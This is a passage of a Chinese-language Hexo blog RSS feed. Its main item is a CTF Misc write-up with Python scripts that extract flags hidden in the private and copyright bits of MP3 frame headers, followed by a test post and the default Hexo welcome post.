&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;port 17033 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/09/17/CTF%E5%B0%8F%E8%AE%AD/Misc/Misc%E2%80%94%E2%80%94%E7%A7%81%E6%9C%89bit%E9%9A%90%E5%86%99/</guid>
            <title>Misc——私有bit隐写</title>
            <link>https://kiyomijin.github.io/2022/09/17/CTF%E5%B0%8F%E8%AE%AD/Misc/Misc%E2%80%94%E2%80%94%E7%A7%81%E6%9C%89bit%E9%9A%90%E5%86%99/</link>
            <category>CTF小训</category>
            <category>Misc</category>
            <pubDate>Sat, 17 Sep 2022 14:02:32 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;0x01-知识点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x01-知识点&#34;&gt;#&lt;/a&gt; &lt;strong&gt;0x01 知识点&lt;/strong&gt;&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;typedef FrameHeader&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;// 类型     字段名:bit数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int sync:12;                        //同步信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int version:2;                      //版本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int layer: 2;                       //层&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int error protection:1;             //CRC校验&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int bitrate_index:4;                //位率&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int sampling_frequency:2;           //采样频率&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int padding:1;                      //帧长调节&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int private:1;                      //保留字 【通常藏有flag】&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int mode:2;                         //声道模式&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int mode extension:2;        		 //扩充模式&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int copyright:1;                    //版权   【通常藏有flag】&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int original:1;                     //原版标志&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int emphasis:2;                     //强调模式&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;帧长度是压缩时每一帧的长度， &lt;code&gt;包括帧头&lt;/code&gt; 的 4 个字节（32bit）。它将填充的空位也计算在内。&lt;/li&gt;
&lt;li&gt;padding 的值会影响每一帧的长度（具体分析见下面的题目），因为只有 1 位，因此长度也只限于在 0 和 1 之间变化&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;0x02-题目分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x02-题目分析&#34;&gt;#&lt;/a&gt; 0x02 题目分析&lt;/h2&gt;
&lt;p&gt;将解压后的 &lt;code&gt;1.mp3&lt;/code&gt;  文件用 010Editor 打开&lt;/p&gt;
&lt;p&gt;可以看到一个 mp3 文件，里面基本上由 mf 数组构成。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220917115510767.png&#34; alt=&#34;image-20220917115510767&#34;&gt;&lt;/p&gt;
&lt;p&gt;分析详见图片&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220917120013835.png&#34; alt=&#34;image-20220917120013835&#34;&gt;&lt;/p&gt;
&lt;p&gt;接着，可以发现，每个 mf 数组大小不一，有的是 0x1A1，有的 0x1A2&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220917120301874.png&#34; alt=&#34;image-20220917120301874&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;图中可知，private_bit 的数值的在 0 和 1 中变化，可以让 &lt;code&gt;copyright&lt;/code&gt;  、 &lt;code&gt;private_bit&lt;/code&gt;  这样的单 bit 位在 0 和 1 之间发生改变，进而影响了单独 mf 数组的大小。因此，这两位在整个 mf 数组中连续拼接可能藏有 flag 或者重要的信息，优先提取。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;0x03-解析脚本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x03-解析脚本&#34;&gt;#&lt;/a&gt; 0x03 解析脚本&lt;/h2&gt;
&lt;p&gt;脚本如下：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;comment&#34;&gt;# coding:utf-8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; re&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   n = &lt;span class=&#34;number&#34;&gt;0x399D0&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;  &lt;span class=&#34;comment&#34;&gt;# 起始位置，为什么+2 下面有解释&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   target_bit = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   flag = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   file = &lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;1.mp3&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;rb&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# 以二进制打开文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;comment&#34;&gt;# 提取&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; n &amp;lt; &lt;span class=&#34;number&#34;&gt;0x294C6A&lt;/span&gt;:  &lt;span class=&#34;comment&#34;&gt;# 结束位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       file.seek(n, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# 从头吃掉第一帧前面的字节(0x399D0) + frame_sync、 mpeg_id、layer_id、protection_bit这四个字段(16bit，即2字节)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       byte = file.read(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;#往后读取一个字节（8位）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       padding = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;:08b&amp;#125;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(byte))[-&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;] &lt;span class=&#34;comment&#34;&gt;#从中提取倒数第2个bit 也就是padding的值 ord函数，是chr函数的对应，将字符变成10进制数字&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       target_bit += &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;:08b&amp;#125;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(byte))[-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] &lt;span class=&#34;comment&#34;&gt;#从中提取倒数第1个bit 也就是private_bit的值，需要累加拼接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; padding == &lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           n += &lt;span class=&#34;number&#34;&gt;0x1A2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           n += &lt;span class=&#34;number&#34;&gt;0x1A1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(target_bit)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;comment&#34;&gt;#textArr = re.findall(&amp;#x27;.&amp;#123;&amp;#x27;+str(8)+&amp;#x27;&amp;#125;&amp;#x27;, result)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   textArr = re.findall(&lt;span class=&#34;string&#34;&gt;r&amp;#x27;\d&amp;#123;8&amp;#125;&amp;#x27;&lt;/span&gt;, target_bit) &lt;span class=&#34;comment&#34;&gt;#利用正则匹配每8个数字为一组，将其变为字符串数组方便处理&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(textArr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; textArr:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       flag += &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(i, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)).strip(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;)     &lt;span class=&#34;comment&#34;&gt;#int(&amp;#x27;二进制数&amp;#x27;, 2) 就转成了10进制   chr(&amp;#x27;10进制数&amp;#x27;) 就转成字符&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;comment&#34;&gt;#print(flag) #发现后面有很多未知空字符，删也删不掉&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   flag = re.findall(&lt;span class=&#34;string&#34;&gt;r&amp;#x27;\w+\&amp;#123;.+\&amp;#125;&amp;#x27;&lt;/span&gt;,flag) &lt;span class=&#34;comment&#34;&gt;#用正则匹配标准flag&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(flag[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p 0k4_YOu_Seem_s0_cl3ver_t0_find_f1ag!=&#34;&#34;&gt;flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220917134916608.png&#34; alt=&#34;image-20220917134916608&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x04-常用正则补充&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x04-常用正则补充&#34;&gt;#&lt;/a&gt; 0x04 常用正则 (补充)&lt;/h2&gt;
&lt;p&gt;①&lt;strong&gt;显示不可打印的字符&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;字符&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;\a&lt;/td&gt;
&lt;td&gt;报警&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\b&lt;/td&gt;
&lt;td&gt;退格&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\f&lt;/td&gt;
&lt;td&gt;换页&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\n&lt;/td&gt;
&lt;td&gt;换行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\r&lt;/td&gt;
&lt;td&gt;回车&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\t&lt;/td&gt;
&lt;td&gt;字表符&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;②&lt;strong&gt;指定预定义的字符集&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;字符&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;\d&lt;/td&gt;
&lt;td&gt;任意一个十进制数字 [0-9]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\D&lt;/td&gt;
&lt;td&gt;任意一个非十进制数字&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\s&lt;/td&gt;
&lt;td&gt;任意一个空白字符 (空格、换行符、换页符、回车符、字表符)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\S&lt;/td&gt;
&lt;td&gt;任意一个非空白字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\w&lt;/td&gt;
&lt;td&gt;任意一个单词字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\W&lt;/td&gt;
&lt;td&gt;任意个非单词字符&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;③&lt;strong&gt;限定符 (？*+{n，m}.)&lt;/strong&gt;&lt;br&gt;
 限定符主要是用来限定每个字符串出现的次数。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;限定字符&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;？&lt;/td&gt;
&lt;td&gt;零次或一次&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;*&lt;/td&gt;
&lt;td&gt;零次或多次&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;+&lt;/td&gt;
&lt;td&gt;一次或多次&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td n=&#34;&#34;&gt;&lt;/td&gt;
&lt;td&gt;n 次&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td n,=&#34;&#34;&gt;&lt;/td&gt;
&lt;td&gt;至少 n 次&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td n,m=&#34;&#34;&gt;&lt;/td&gt;
&lt;td&gt;n 到 m 次&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.&lt;/td&gt;
&lt;td&gt;匹配任意一个字符（不包含换行符）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;0x05-再来一道&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x05-再来一道&#34;&gt;#&lt;/a&gt; 0x05 再来一道&lt;/h2&gt;
&lt;p&gt;翻看了几帧发现 &lt;code&gt;private_bit&lt;/code&gt;  位都是 0，似乎并没有存储数据。但是在翻看的时候发现，&lt;ins&gt; &lt;code&gt;uint32 copyright&lt;/code&gt;  这一位似乎内藏玄机&lt;/ins&gt;，这一位在相邻几帧的数据有 0 有 1，查询得知这是版权位，通常不会出现不同帧有 0 有 1 的情况。&lt;/p&gt;
&lt;p&gt;于是决定将 &lt;code&gt;copyright&lt;/code&gt;  位的数据提取出来看看。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220917134512128.png&#34; alt=&#34;image-20220917134512128&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# coding:utf-8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; re&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;n = &lt;span class=&#34;number&#34;&gt;0xF05A4&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;  &lt;span class=&#34;comment&#34;&gt;# 起始位置，为什么+2 下面有解释&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target_bit = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file = &lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;2.mp3&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;rb&amp;#x27;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# 以二进制打开文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 提取&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; n &amp;lt; &lt;span class=&#34;number&#34;&gt;0xC12623&lt;/span&gt;:  &lt;span class=&#34;comment&#34;&gt;# 结束位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    file.seek(n, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# 从头吃掉第一帧前面的字节(0x399D0) + frame_sync、 mpeg_id、layer_id、protection_bit这四个字段(16bit，即2字节)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    byte = file.read(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# 往后读取一个字节（8位）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    padding = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;:08b&amp;#125;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(byte))[-&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]  &lt;span class=&#34;comment&#34;&gt;# 从中提取倒数第2个bit 也就是padding的值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    file.seek(n + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    byte = file.read(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    target_bit += &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;:08b&amp;#125;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(byte))[-&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;]  &lt;span class=&#34;comment&#34;&gt;# 从中提取倒数第1个bit 也就是copyright的值，需要累加拼接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; padding == &lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        n += &lt;span class=&#34;number&#34;&gt;0x415&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        n += &lt;span class=&#34;number&#34;&gt;0x414&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(target_bit)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# textArr = re.findall(&amp;#x27;.&amp;#123;&amp;#x27;+str(8)+&amp;#x27;&amp;#125;&amp;#x27;, result)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;textArr = re.findall(&lt;span class=&#34;string&#34;&gt;r&amp;#x27;\d&amp;#123;8&amp;#125;&amp;#x27;&lt;/span&gt;, target_bit)  &lt;span class=&#34;comment&#34;&gt;# 利用正则匹配每8个数字为一组，将其变为字符串数组方便处理&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(textArr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; textArr:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    flag += &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(i, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)).strip(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# int(&amp;#x27;二进制数&amp;#x27;, 2) 就转成了10进制   chr(&amp;#x27;10进制数&amp;#x27;) 就转成字符&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag = re.findall(&lt;span class=&#34;string&#34;&gt;r&amp;#x27;\w+\&amp;#123;.+\&amp;#125;&amp;#x27;&lt;/span&gt;,flag)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(flag[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p b3d7bed5-e8da-4d9c-848c-e5d332d63bcd=&#34;&#34;&gt;flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220917134626086.png&#34; alt=&#34;image-20220917134626086&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/07/14/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/</guid>
            <title>测试文章</title>
            <link>https://kiyomijin.github.io/2022/07/14/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/</link>
            <category>原创</category>
            <pubDate>Thu, 14 Jul 2022 03:13:28 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;这是一篇测试文章&lt;/p&gt;
&lt;img src=&#34;/2022/07/14/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/test.png&#34; class=&#34;&#34; title=&#34;图片引用方法一&#34;&gt;
&lt;p&gt;&lt;img src=&#34;test.png&#34; alt=&#34;图片引用方法二&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/07/13/hello-world/</guid>
            <title>Hello World</title>
            <link>https://kiyomijin.github.io/2022/07/13/hello-world/</link>
            <pubDate>Wed, 13 Jul 2022 23:20:21 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;Welcome to &lt;a href=&#34;https://hexo.io/&#34;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&#34;https://hexo.io/docs/&#34;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&#34;https://hexo.io/docs/troubleshooting.html&#34;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&#34;https://github.com/hexojs/hexo/issues&#34;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;quick-start&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#quick-start&#34;&gt;#&lt;/a&gt; Quick Start&lt;/h2&gt;
&lt;h3 id=&#34;create-a-new-post&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#create-a-new-post&#34;&gt;#&lt;/a&gt; Create a new post&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo new &lt;span class=&#34;string&#34;&gt;&amp;quot;My New Post&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/writing.html&#34;&gt;Writing&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;run-server&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#run-server&#34;&gt;#&lt;/a&gt; Run server&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/server.html&#34;&gt;Server&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;generate-static-files&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#generate-static-files&#34;&gt;#&lt;/a&gt; Generate static files&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo generate&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/generating.html&#34;&gt;Generating&lt;/a&gt;&lt;/p&gt;
